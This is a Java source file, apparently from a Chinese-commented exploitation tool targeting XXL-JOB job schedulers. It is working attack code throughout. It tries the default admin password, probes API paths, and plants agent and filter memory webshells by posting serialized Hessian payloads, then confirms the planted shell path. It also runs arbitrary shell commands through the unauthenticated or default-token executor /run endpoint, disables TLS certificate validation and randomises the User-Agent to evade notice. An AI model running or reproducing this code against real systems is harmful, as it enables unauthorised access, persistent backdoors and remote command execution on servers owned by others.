package com.pureqh.attack;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.Proxy;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.util.*;

import cn.hutool.core.util.RandomUtil;
import cn.hutool.http.Method;
import com.pureqh.attack.entity.ControllersFactory;
import com.pureqh.ui.MainController;
import com.pureqh.util.Utils;
import org.json.JSONObject;

import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

/**
 * @Author：index
 * @Date：2024/7/17 15:59
 */
public class AttackService {

    public static Map<String, String> globalHeader = null;
    public HashMap<String, String> headers = new HashMap<>();//存放请求头，可以存放多个请求头
    //随机化UA
    public String OSType[] = {"Windows NT 10.0; Win64; x64", "PlayStation 4 3.11", "Macintosh; Intel Mac OS X 10.13; rv:57.0", "Linux; Android 5.1; AFTS Build/LMY47O"};
    public String EngineType[] = {" Gecko/20100101", " AppleWebKit/534.12 (KHTML, like Gecko)"};
    public String BrowserType[] = {" Firefox", " Chrome", " Mobile"};
    public String UA = "Mozilla/5.0 (" + RandomUtil.randomEle(OSType) + ")" + RandomUtil.randomEle(EngineType) + RandomUtil.randomEle(BrowserType) + "/" + RandomUtil.randomInt(40, 100) + "." + RandomUtil.randomInt(40, 88);


    public AttackService() {

    }
    public String TestRequest(String url,String timeout) {
        Integer timeouts = Integer.parseInt(timeout) * 1000;
        Proxy proxy = (Proxy)MainController.currentProxy.get("proxy");
        String result = "";
        int code = 0;
        HttpURLConnection con = null;
        if (proxy != null) {
            try {
                //跳过https验证
                TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {
                    public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                        return null;
                    }
                    public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {
                    }
                    public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {
                    }
                }};

                try {
                    SSLContext sc = SSLContext.getInstance("TLS");
                    sc.init(null, trustAllCerts, new java.security.SecureRandom());
                    HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
                } catch (Exception e) {
                    e.printStackTrace();
                }

                //url去空
                URL urls = new URL(url.trim());
                //得到连接对象
                con = (HttpURLConnection) urls.openConnection(proxy);
                // 设置连接超时时间
                con.setConnectTimeout(timeouts);
                // 设置读取超时时间
                con.setReadTimeout(timeouts);

                //设置请求类型
                con.setRequestMethod("GET");
                con.setRequestProperty("User-Agent", UA);
                con.usingProxy();
                //允许写出
                con.setDoOutput(true);
                //允许读入
                con.setDoInput(true);
                //不使用缓存
                con.setUseCaches(false);
                System.out.println(con.getResponseCode());
                code = con.getResponseCode();
                if (code == 200) {
                    return "success";

                }
            } catch (IOException e) {
                return "error";
            }
        }else{
            try {
                URL urls = new URL(url.trim());
                //得到连接对象
                con = (HttpURLConnection) urls.openConnection();
                // 设置连接超时时间为
                con.setConnectTimeout(timeouts);
                // 设置读取超时时间为
                con.setReadTimeout(timeouts);

                //设置请求类型
                con.setRequestMethod("GET");
                con.setRequestProperty("User-Agent", UA);
                con.usingProxy();
                //允许写出
                con.setDoOutput(true);
                //允许读入
                con.setDoInput(true);
                //不使用缓存
                con.setUseCaches(false);
                System.out.println(con.getResponseCode());
                code = con.getResponseCode();
                if (code == 200) {
                    return "success";
                }
            } catch (IOException e) {
                return "error";
            }
        }
        return "success";
    }

    public String passIntruderAttack(String url, String timeout) {
        Integer timeouts = Integer.parseInt(timeout) * 1000;
        Proxy proxy = (Proxy)MainController.currentProxy.get("proxy");
        String result = "";
        int code = 0;
        HttpURLConnection con = null;
        if (proxy != null) {
            try {
                //跳过https验证
                TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {
                    public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                        return null;
                    }
                    public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {
                    }
                    public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {
                    }
                }};

                try {
                    SSLContext sc = SSLContext.getInstance("TLS");
                    sc.init(null, trustAllCerts, new java.security.SecureRandom());
                    HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
                } catch (Exception e) {
                    e.printStackTrace();
                }

                //url去空
                URL urls = new URL(url.trim()+"/xxl-job-admin/login");

                // 打开连接
                con = (HttpURLConnection) urls.openConnection(proxy);
                // 设置连接超时时间
                con.setConnectTimeout(timeouts);
                // 设置读取超时时间
                con.setReadTimeout(timeouts);
                // 设置请求方法为POST
                con.setRequestMethod("POST");
                //添加ua
                con.setRequestProperty("User-Agent", UA );
                // 设置请求头Content-Type
                con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
                con.usingProxy();
                //允许写出
                con.setDoOutput(true);
                //允许读入
                con.setDoInput(true);
                //不使用缓存
                con.setUseCaches(false);

                // 构建请求参数
                String params = "userName=admin&password=123456";

                // 获取输出流并写入请求参数
                try (OutputStream os = con.getOutputStream()) {
                    os.write(params.getBytes());
                    os.flush();
                }

                // 获取响应头字段
                Map<String, List<String>> reqHeaders = con.getHeaderFields();

                // 检查是否存在set-Cookie
                List<String> reqHeaderValues = reqHeaders.get("Set-Cookie");
                if (reqHeaderValues != null && !reqHeaderValues.isEmpty()) {
                    return "success";
                } else {
                    return "error";
                }


            } catch (IOException e) {
                return "error";
            }
        }else{
            try {
                //url去空
                URL urls = new URL(url.trim()+"/xxl-job-admin/login");

                // 打开连接
                con = (HttpURLConnection) urls.openConnection();
                // 设置连接超时时间
                con.setConnectTimeout(timeouts);
                // 设置读取超时时间
                con.setReadTimeout(timeouts);
                // 设置请求方法为POST
                con.setRequestMethod("POST");
                //添加ua
                con.setRequestProperty("User-Agent", UA );
                // 设置请求头Content-Type
                con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
                con.usingProxy();
                //允许写出
                con.setDoOutput(true);
                //允许读入
                con.setDoInput(true);
                //不使用缓存
                con.setUseCaches(false);

                // 构建请求参数
                String params = "userName=admin&password=123456";

                // 获取输出流并写入请求参数
                try (OutputStream os = con.getOutputStream()) {
                    os.write(params.getBytes());
                    os.flush();
                }

                // 获取响应头字段
                Map<String, List<String>> reqHeaders = con.getHeaderFields();

                // 检查是否存在set-Cookie
                List<String> reqHeaderValues = reqHeaders.get("Set-Cookie");
                if (reqHeaderValues != null && !reqHeaderValues.isEmpty()) {
                    return "success";
                } else {
                    return "error";
                }

            } catch (IOException e) {
                return "error";
            }
        }


    }

    public String apiScanAttack(String url,String timeout) {
        Integer timeouts = Integer.parseInt(timeout) * 1000;
        Proxy proxy = (Proxy)MainController.currentProxy.get("proxy");
        String result = "";
        int code = 0;
        HttpURLConnection con = null;
        String dict = "/api\n" +
                "/xxl-job-admin/api";
        List<String> dictList = Arrays.asList(dict.split("\n"));
        if (proxy != null) {
            try {
                //跳过https验证
                TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {
                    public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                        return null;
                    }
                    public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {
                    }
                    public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {
                    }
                }};

                try {
                    SSLContext sc = SSLContext.getInstance("TLS");
                    sc.init(null, trustAllCerts, new java.security.SecureRandom());
                    HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
                } catch (Exception e) {
                    e.printStackTrace();
                }

                for (int i = 0; i < dictList.size(); i++) {
                    String payload = (String) dictList.get(i);
                    //url去空
                    URL urls = new URL(url.trim()+payload);
                    //得到连接对象
                    con = (HttpURLConnection) urls.openConnection(proxy);
                    // 设置连接超时时间
                    con.setConnectTimeout(timeouts);
                    // 设置读取超时时间
                    con.setReadTimeout(timeouts);

                    //设置请求类型
                    con.setRequestMethod("GET");
                    con.setRequestProperty("User-Agent", UA);
                    con.usingProxy();
                    //允许写出
                    con.setDoOutput(true);
                    //允许读入
                    con.setDoInput(true);
                    //不使用缓存
                    con.setUseCaches(false);
                    System.out.println(con.getResponseCode());
                    code = con.getResponseCode();
                    if (code != 200) {
                        return "error";
                    }else{
                        return payload;
                    }
                }
            } catch (IOException e) {
                return "error";
            }
        }else{
            try {
                for (int i = 0; i < dictList.size(); i++) {
                    String payload = (String) dictList.get(i);
                    //url去空
                    URL urls = new URL(url.trim()+payload);
                    //得到连接对象
                    con = (HttpURLConnection) urls.openConnection();
                    // 设置连接超时时间
                    con.setConnectTimeout(timeouts);
                    // 设置读取超时时间
                    con.setReadTimeout(timeouts);

                    //设置请求类型
                    con.setRequestMethod("GET");
                    con.setRequestProperty("User-Agent", UA);
                    con.usingProxy();
                    //允许写出
                    con.setDoOutput(true);
                    //允许读入
                    con.setDoInput(true);
                    //不使用缓存
                    con.setUseCaches(false);
                    System.out.println(con.getResponseCode());
                    code = con.getResponseCode();
                    if (code != 200) {
                        return "error";
                    }else{
                        return payload;
                    }
                }
            } catch (IOException e) {
                return "error";
            }
        }
        return "error";
    }

    //打入agent内存马
    public String injectShellAttack(String url,String timeout,String path) {
        Integer timeouts = Integer.parseInt(timeout) * 1000;
        Proxy proxy = (Proxy)MainController.currentProxy.get("proxy");
        String result = "";
        int code = 0;
        HttpURLConnection con = null;

        String agentserPath = "/agent.ser";
        String xsltserPath = "/xslt.ser";
        String expserPath = "/exp.ser";
        List<String> dictList = new ArrayList<>();
        dictList.add(agentserPath);
        dictList.add(xsltserPath);
        dictList.add(expserPath);
        String shellPath = "/xxl-job-admin/luckydayb";


        if (proxy != null) {
            try {
                //跳过https验证
                TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {
                    public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                        return null;
                    }
                    public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {
                    }
                    public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {
                    }
                }};

                try {
                    SSLContext sc = SSLContext.getInstance("TLS");
                    sc.init(null, trustAllCerts, new java.security.SecureRandom());
                    HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
                } catch (Exception e) {
                    e.printStackTrace();
                }

                for (int i = 0; i < dictList.size(); i++) {
                    String payload = (String) dictList.get(i);
                    //url去空
                    URL urls = new URL(url.trim() + path);
                    //得到连接对象
                    con = (HttpURLConnection) urls.openConnection(proxy);
                    //开启代理
                    con.usingProxy();
                    // 设置请求方法为POST
                    con.setRequestMethod("POST");
                    // 设置连接超时时间
                    con.setConnectTimeout(timeouts);
                    // 设置读取超时时间
                    con.setReadTimeout(timeouts);
                    // 设置允许输出
                    con.setDoOutput(true);
                    // 设置Content-Type及ua
                    con.setRequestProperty("User-Agent", UA);
                    con.setRequestProperty("Content-Type", "x-application/hessian");

                    // 从resources目录读取文件
                    InputStream is = getClass().getResourceAsStream(payload);

                    // 读取文件到字节数组
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    byte[] buffer = new byte[102400];
                    int len;
                    while ((len = is.read(buffer)) != -1) {
                        baos.write(buffer, 0, len);
                    }
                    byte[] fileData = baos.toByteArray();

                    // 获取输出流
                    OutputStream os = con.getOutputStream();

                    // 写入文件数据
                    os.write(fileData);
                    os.flush();
                    os.close();

                    int responseCode = con.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        System.out.println(dictList.get(i)+"upload success");
                    } else {
                        return "error";
                    }
                }
                //验证内存马是否成功打入
                URL urls =  new URL(url.trim() + shellPath);
                con = (HttpURLConnection) urls.openConnection();
                con.setRequestMethod("GET");
                con.setConnectTimeout(timeouts);
                con.setReadTimeout(timeouts);
                if (con.getResponseCode() == HttpURLConnection.HTTP_OK) {
                    return "[+] 内存马注入成功\n" +
                            "Vagent内存马路径为:"+url+path+"/luckydayb";
                } else {
                    return "[-] 内存马注入失败";
                }


            } catch (IOException e) {
                return "error";
            }
        }else{
            try {
                for (int i = 0; i < dictList.size(); i++) {
                    String payload = (String) dictList.get(i);
                    //url去空
                    URL urls = new URL(url.trim() + path);
                    //得到连接对象
                    con = (HttpURLConnection) urls.openConnection();
                    // 设置请求方法为POST
                    con.setRequestMethod("POST");
                    // 设置连接超时时间
                    con.setConnectTimeout(timeouts);
                    // 设置读取超时时间
                    con.setReadTimeout(timeouts);
                    // 设置允许输出
                    con.setDoOutput(true);
                    // 设置Content-Type及ua
                    con.setRequestProperty("User-Agent", UA);
                    con.setRequestProperty("Content-Type", "x-application/hessian");

                    // 从resources目录读取文件
                    InputStream is = getClass().getResourceAsStream(payload);

                    // 读取文件到字节数组
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    byte[] buffer = new byte[102400];
                    int len;
                    while ((len = is.read(buffer)) != -1) {
                        baos.write(buffer, 0, len);
                    }
                    byte[] fileData = baos.toByteArray();

                    // 获取输出流
                    OutputStream os = con.getOutputStream();

                    // 写入文件数据
                    os.write(fileData);
                    os.flush();
                    os.close();

                    int responseCode = con.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        System.out.println(dictList.get(i)+"upload success");
                    } else {
                        return "error";
                    }
                }

                //验证内存马是否成功打入
                URL urls =  new URL(url.trim() + shellPath);
                con = (HttpURLConnection) urls.openConnection();
                con.setRequestMethod("GET");
                con.setConnectTimeout(timeouts);
                con.setReadTimeout(timeouts);
                if (con.getResponseCode() == HttpURLConnection.HTTP_OK) {
                    return "[+] 内存马注入成功\n" +
                            "Vagent内存马路径为:"+url+path+"/luckydayb";
                } else {
                    return "[-] 内存马注入失败";
                }


            } catch (IOException e) {
                return "error";
            }
        }

    }

    //新增filter内存马
    public String injectFilterShellAttack(String url,String timeout,String path) {
        Integer timeouts = Integer.parseInt(timeout) * 1000;
        Proxy proxy = (Proxy)MainController.currentProxy.get("proxy");
        String result = "";
        int code = 0;
        HttpURLConnection con = null;

        String agentserPath = "/filter.ser";
        String expserPath = "/exp.ser";
        List<String> dictList = new ArrayList<>();
        dictList.add(agentserPath);
        dictList.add(expserPath);
        String shellPath = "/xxl-job-admin/luckydayb";



        if (proxy != null) {
            try {
                //跳过https验证
                TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {
                    public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                        return null;
                    }
                    public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {
                    }
                    public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {
                    }
                }};

                try {
                    SSLContext sc = SSLContext.getInstance("TLS");
                    sc.init(null, trustAllCerts, new java.security.SecureRandom());
                    HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
                } catch (Exception e) {
                    e.printStackTrace();
                }

                for (int i = 0; i < dictList.size(); i++) {
                    String payload = (String) dictList.get(i);
                    //url去空
                    URL urls = new URL(url.trim() + path);
                    //得到连接对象
                    con = (HttpURLConnection) urls.openConnection(proxy);
                    //开启代理
                    con.usingProxy();
                    // 设置请求方法为POST
                    con.setRequestMethod("POST");
                    // 设置连接超时时间
                    con.setConnectTimeout(timeouts);
                    // 设置读取超时时间
                    con.setReadTimeout(timeouts);
                    // 设置允许输出
                    con.setDoOutput(true);
                    // 设置Content-Type及ua
                    con.setRequestProperty("User-Agent", UA);
                    con.setRequestProperty("Content-Type", "x-application/hessian");

                    // 从resources目录读取文件
                    InputStream is = getClass().getResourceAsStream(payload);

                    // 读取文件到字节数组
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    byte[] buffer = new byte[102400];
                    int len;
                    while ((len = is.read(buffer)) != -1) {
                        baos.write(buffer, 0, len);
                    }
                    byte[] fileData = baos.toByteArray();

                    // 获取输出流
                    OutputStream os = con.getOutputStream();

                    // 写入文件数据
                    os.write(fileData);
                    os.flush();
                    os.close();

                    int responseCode = con.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        System.out.println(dictList.get(i)+"upload success");
                    } else {
                        return "error";
                    }
                }
                //验证内存马是否成功打入
                URL urls =  new URL(url.trim() + shellPath);
                con = (HttpURLConnection) urls.openConnection();
                con.setRequestMethod("GET");
                con.setConnectTimeout(timeouts);
                con.setReadTimeout(timeouts);
                if (con.getResponseCode() == HttpURLConnection.HTTP_OK) {
                    return "[+] 内存马注入成功\n" +
                            "Filter内存马路径为:"+url+shellPath;
                } else {
                    return "[-] 内存马注入失败";
                }


            } catch (IOException e) {
                return "error";
            }
        }else{
            try {
                for (int i = 0; i < dictList.size(); i++) {
                    String payload = (String) dictList.get(i);
                    //url去空
                    URL urls = new URL(url.trim() + path);
                    //得到连接对象
                    con = (HttpURLConnection) urls.openConnection();
                    // 设置请求方法为POST
                    con.setRequestMethod("POST");
                    // 设置连接超时时间
                    con.setConnectTimeout(timeouts);
                    // 设置读取超时时间
                    con.setReadTimeout(timeouts);
                    // 设置允许输出
                    con.setDoOutput(true);
                    // 设置Content-Type及ua
                    con.setRequestProperty("User-Agent", UA);
                    con.setRequestProperty("Content-Type", "x-application/hessian");

                    // 从resources目录读取文件
                    InputStream is = getClass().getResourceAsStream(payload);

                    // 读取文件到字节数组
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    byte[] buffer = new byte[102400];
                    int len;
                    while ((len = is.read(buffer)) != -1) {
                        baos.write(buffer, 0, len);
                    }
                    byte[] fileData = baos.toByteArray();

                    // 获取输出流
                    OutputStream os = con.getOutputStream();

                    // 写入文件数据
                    os.write(fileData);
                    os.flush();
                    os.close();

                    int responseCode = con.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        System.out.println(dictList.get(i)+"upload success");
                    } else {
                        return "error";
                    }
                }

                //验证内存马是否成功打入
                URL urls =  new URL(url.trim() + shellPath);
                con = (HttpURLConnection) urls.openConnection();
                con.setRequestMethod("GET");
                con.setConnectTimeout(timeouts);
                con.setReadTimeout(timeouts);
                if (con.getResponseCode() == HttpURLConnection.HTTP_OK) {
                    return "[+] 内存马注入成功\n" +
                            "Filter内存马路径为:"+url+shellPath;
                } else {
                    return "[-] 内存马注入失败";
                }


            } catch (IOException e) {
                return "error";
            }
        }

    }
    public String runApiUnauthorizedAttack(String url,String timeout, String command) {
        Integer timeouts = Integer.parseInt(timeout) * 1000;
        Proxy proxy = (Proxy)MainController.currentProxy.get("proxy");
        String result = "";
        int code = 0;
        HttpURLConnection con = null;
        Random random = new Random();
        int num = 100 + random.nextInt(900);


        if (proxy != null) {
            try {
                //跳过https验证
                TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {
                    public X509Certificate[] getAcceptedIssuers() {
                        return null;
                    }
                    public void checkClientTrusted(X509Certificate[] certs, String authType) {
                    }
                    public void checkServerTrusted(X509Certificate[] certs, String authType) {
                    }
                }};

                try {
                    SSLContext sc = SSLContext.getInstance("TLS");
                    sc.init(null, trustAllCerts, new SecureRandom());
                    HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
                } catch (Exception e) {
                    e.printStackTrace();
                }

                //提取url
                // 找到最后一个冒号的位置
                int lastColonIndex = url.lastIndexOf(':');

                // 如果找到了冒号，截取冒号之前的部分
                if (lastColonIndex != -1) {
                    url = url.substring(0, lastColonIndex);
                }
                //url去空
                URL urls = new URL(url.trim()+":9999/run");
                con = (HttpURLConnection) urls.openConnection(proxy);
                //使用代理
                con.usingProxy();
                // 设置连接超时时间
                con.setConnectTimeout(timeouts);
                // 设置读取超时时间
                con.setReadTimeout(timeouts);
                // 设置请求方法
                con.setRequestMethod("POST");

                // 设置允许输出
                con.setDoOutput(true);

                // 设置Content-Type及ua
                con.setRequestProperty("Content-Type", "application/json");
                con.setRequestProperty("User-Agent", UA);
                // 构建JSON数据
                JSONObject jsonInput = new JSONObject();
                jsonInput.put("jobId", num);
                jsonInput.put("executorHandler", "demoJobHandler");
                jsonInput.put("executorParams", "demoJobHandler");
                jsonInput.put("executorBlockStrategy", "COVER_EARLY");
                jsonInput.put("executorTimeout", "0");
                jsonInput.put("logId", "1");
                jsonInput.put("logDateTime", "1586629003729");
                jsonInput.put("glueType", "GLUE_SHELL");
                jsonInput.put("glueSource", command);
                jsonInput.put("glueUpdatetime", "1586699003758");
                jsonInput.put("broadcastIndex", "0");
                jsonInput.put("broadcastTotal", "0");


                // 将JSON数据写入输出流
                try {
                    try (OutputStream os = con.getOutputStream()) {
                        byte[] input = jsonInput.toString().getBytes("utf-8");
                        os.write(input, 0, input.length);
                    }
                } catch (Exception e) {
                    return "error";
                }

                // 检查响应码
                int responseCode = con.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    // 读取响应
                    BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
                    String inputLine;
                    StringBuffer response = new StringBuffer();

                    while ((inputLine = in.readLine()) != null) {
                        response.append(inputLine);
                    }
                    in.close();

                    if (response.toString().indexOf("200")!=0){
                        return "success";
                    }
                } else {
                   return "error";
                }


            } catch (IOException e) {
                return "error";
            }
        }else{
            try {
                //提取url
                // 找到最后一个冒号的位置
                int lastColonIndex = url.lastIndexOf(':');

                // 如果找到了冒号，截取冒号之前的部分
                if (lastColonIndex != -1) {
                    url = url.substring(0, lastColonIndex);
                }
                //url去空
                URL urls = new URL(url.trim()+":9999/run");
                con = (HttpURLConnection) urls.openConnection();

                // 设置连接超时时间
                con.setConnectTimeout(timeouts);
                // 设置读取超时时间
                con.setReadTimeout(timeouts);
                // 设置请求方法
                con.setRequestMethod("POST");

                // 设置允许输出
                con.setDoOutput(true);

                // 设置Content-Type及ua
                con.setRequestProperty("Content-Type", "application/json");
                con.setRequestProperty("User-Agent", UA);
                // 构建JSON数据
                JSONObject jsonInput = new JSONObject();
                jsonInput.put("jobId", num);
                jsonInput.put("executorHandler", "demoJobHandler");
                jsonInput.put("executorParams", "demoJobHandler");
                jsonInput.put("executorBlockStrategy", "COVER_EARLY");
                jsonInput.put("executorTimeout", "0");
                jsonInput.put("logId", "1");
                jsonInput.put("logDateTime", "1586629003729");
                jsonInput.put("glueType", "GLUE_SHELL");
                jsonInput.put("glueSource", command);
                jsonInput.put("glueUpdatetime", "1586699003758");
                jsonInput.put("broadcastIndex", "0");
                jsonInput.put("broadcastTotal", "0");


                // 将JSON数据写入输出流
                try {
                    try (OutputStream os = con.getOutputStream()) {
                        byte[] input = jsonInput.toString().getBytes("utf-8");
                        os.write(input, 0, input.length);
                    }
                } catch (Exception e) {
                    return "error";
                }

                // 检查响应码
                int responseCode = con.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    // 读取响应
                    BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
                    String inputLine;
                    StringBuffer response = new StringBuffer();

                    while ((inputLine = in.readLine()) != null) {
                        response.append(inputLine);
                    }
                    in.close();

                    if (response.toString().indexOf("200")!=0){
                        return "success";
                    }
                } else {
                    return "error";
                }


            } catch (IOException e) {
                return "error";
            }
        }
        return "error";

    }

    public String defaultTokenAttack(String url,String timeout, String command) {
        Integer timeouts = Integer.parseInt(timeout) * 1000;
        Proxy proxy = (Proxy)MainController.currentProxy.get("proxy");
        String result = "";
        int code = 0;
        HttpURLConnection con = null;
        Random random = new Random();
        int num = 100 + random.nextInt(900);


        if (proxy != null) {
            try {
                //跳过https验证
                TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {
                    public X509Certificate[] getAcceptedIssuers() {
                        return null;
                    }
                    public void checkClientTrusted(X509Certificate[] certs, String authType) {
                    }
                    public void checkServerTrusted(X509Certificate[] certs, String authType) {
                    }
                }};

                try {
                    SSLContext sc = SSLContext.getInstance("TLS");
                    sc.init(null, trustAllCerts, new SecureRandom());
                    HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
                } catch (Exception e) {
                    e.printStackTrace();
                }

                //提取url
                // 找到最后一个冒号的位置
                int lastColonIndex = url.lastIndexOf(':');

                // 如果找到了冒号，截取冒号之前的部分
                if (lastColonIndex != -1) {
                    url = url.substring(0, lastColonIndex);
                }
                //url去空
                URL urls = new URL(url.trim()+":9999/run");
                con = (HttpURLConnection) urls.openConnection(proxy);
                //使用代理
                con.usingProxy();
                // 设置连接超时时间
                con.setConnectTimeout(timeouts);
                // 设置读取超时时间
                con.setReadTimeout(timeouts);
                // 设置请求方法
                con.setRequestMethod("POST");

                // 设置允许输出
                con.setDoOutput(true);

                // 设置Content-Type及ua
                con.setRequestProperty("Content-Type", "application/json");
                con.setRequestProperty("User-Agent", UA);
                con.setRequestProperty("XXL-JOB-ACCESS-TOKEN", "default_token");
                // 构建JSON数据
                JSONObject jsonInput = new JSONObject();
                jsonInput.put("jobId", num);
                jsonInput.put("executorHandler", "demoJobHandler");
                jsonInput.put("executorParams", "demoJobHandler");
                jsonInput.put("executorBlockStrategy", "COVER_EARLY");
                jsonInput.put("executorTimeout", "0");
                jsonInput.put("logId", "1");
                jsonInput.put("logDateTime", "1586629003729");
                jsonInput.put("glueType", "GLUE_SHELL");
                jsonInput.put("glueSource", command);
                jsonInput.put("glueUpdatetime", "1586699003758");
                jsonInput.put("broadcastIndex", "0");
                jsonInput.put("broadcastTotal", "0");


                // 将JSON数据写入输出流
                try {
                    try (OutputStream os = con.getOutputStream()) {
                        byte[] input = jsonInput.toString().getBytes("utf-8");
                        os.write(input, 0, input.length);
                    }
                } catch (IOException e) {
                    return "error";
                }

                // 检查响应码
                int responseCode = con.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    // 读取响应
                    BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
                    String inputLine;
                    StringBuffer response = new StringBuffer();

                    while ((inputLine = in.readLine()) != null) {
                        response.append(inputLine);
                    }
                    in.close();

                    if (response.toString().indexOf("200")!=0){
                        return "success";
                    }
                } else {
                    return "error";
                }


            } catch (IOException e) {
                return "error";
            }
        }else{
            try {
                //提取url
                // 找到最后一个冒号的位置
                int lastColonIndex = url.lastIndexOf(':');

                // 如果找到了冒号，截取冒号之前的部分
                if (lastColonIndex != -1) {
                    url = url.substring(0, lastColonIndex);
                }
                //url去空
                URL urls = new URL(url.trim()+":9999/run");
                con = (HttpURLConnection) urls.openConnection();

                // 设置连接超时时间
                con.setConnectTimeout(timeouts);
                // 设置读取超时时间
                con.setReadTimeout(timeouts);
                // 设置请求方法
                con.setRequestMethod("POST");

                // 设置允许输出
                con.setDoOutput(true);

                // 设置Content-Type及ua
                con.setRequestProperty("Content-Type", "application/json");
                con.setRequestProperty("User-Agent", UA);
                con.setRequestProperty("XXL-JOB-ACCESS-TOKEN", "default_token");
                // 构建JSON数据
                JSONObject jsonInput = new JSONObject();
                jsonInput.put("jobId", num);
                jsonInput.put("executorHandler", "demoJobHandler");
                jsonInput.put("executorParams", "demoJobHandler");
                jsonInput.put("executorBlockStrategy", "COVER_EARLY");
                jsonInput.put("executorTimeout", "0");
                jsonInput.put("logId", "1");
                jsonInput.put("logDateTime", "1586629003729");
                jsonInput.put("glueType", "GLUE_SHELL");
                jsonInput.put("glueSource", command);
                jsonInput.put("glueUpdatetime", "1586699003758");
                jsonInput.put("broadcastIndex", "0");
                jsonInput.put("broadcastTotal", "0");


                // 将JSON数据写入输出流
                try {
                    try (OutputStream os = con.getOutputStream()) {
                        byte[] input = jsonInput.toString().getBytes("utf-8");
                        os.write(input, 0, input.length);
                    }
                } catch (Exception e) {
                    return "error";
                }

                // 检查响应码
                int responseCode = con.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    // 读取响应
                    BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
                    String inputLine;
                    StringBuffer response = new StringBuffer();

                    while ((inputLine = in.readLine()) != null) {
                        response.append(inputLine);
                    }
                    in.close();

                    if (response.toString().indexOf("200")!=0){
                        return "success";
                    }
                } else {
                    return "error";
                }


            } catch (IOException e) {
                return "error";
            }
        }
        return "error";

    }
    public static void main(String[] args) {
    }
}
